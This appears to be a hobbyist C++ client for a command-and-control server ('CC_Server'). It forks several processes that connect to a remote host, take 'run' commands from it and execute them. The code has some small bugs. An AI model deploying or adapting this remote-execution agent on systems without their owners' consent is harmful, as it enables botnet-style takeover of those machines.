/*
Copyright (C) 2019 John Broderick

This file is part of CC_Server.

CC_Server is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

CC_Server is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
long with CC_Server.  If not, see <https://www.gnu.org/licenses/>.
*/

#include "client.h"

bool running;
int port, client_count;
int res;

int main(int argc, char** argv) {

	if(argc != 3) {
		cout << "Invalid arguments" << endl;
		return 1;
	}

	port = atoi(argv[1]);

	client_count = atoi(argv[2]);

	running = true;

	if(port <= 0 || client_count < 0) {
		cout << "Invalid arguments" << endl;
		return 1;
	}

	signal(SIGINT, signal_handler);

	int i = 0;

	while(client_count > 0) {
		res = fork();
		if(res == 0) {
			run_client();
			exit(0);
		}
		else {
			client_count--;
		}
	}

	while(running);
	cout << "closing clients" << endl;
	return 0;
}

void signal_handler(int sig) {
	running = false;
}

int run_client() {

	int fd;

	struct sockaddr_in addr;

	char buffer[1024];

	fd = socket(AF_INET, SOCK_STREAM, 0);

	if(fd < 0) {
		cout << "Error opening socket" << endl;
		return 1;
	}

	memset(&addr, '0', sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	if(inet_pton(AF_INET, remote_ip, &addr.sin_addr) <= 0) {
		cout << "Bad address" << endl;
		close(fd);
		return 1;
	}

	while(running) {
		res = connect(fd, (struct sockaddr*) &addr, sizeof(addr));

		if(res < 0) {
			cout << "Connection failed...Terminating" << endl;
			sleep(5);
			continue;
		}

		cout << "Successfully connected...." << endl;

		bzero(buffer, 1024);
		res = read(fd, buffer, 1023);
		if(res < 0) {
			cout << "Error reading from socket" << endl;
		}

		string tokens[20];

		tokenize(buffer, tokens);

		if(tokens[0].compare("run") == 0) {
			cout << "running program..." << endl;
			command_run(tokens);
		}
		else if(tokens[0].compare("exit") == 0) {
			running = false;
			cout << "closing clients...." << endl;
		}
		else {
			cout << buffer << endl;
		}
		bzero(buffer, 1024);
		strcpy(buffer, "Task completed...");
		res = write(fd, buffer, 1023);
		if(res < 0) {
			cout << "Error writing to socket" << endl;
		}
	}

	close(fd);
	return 0;
}
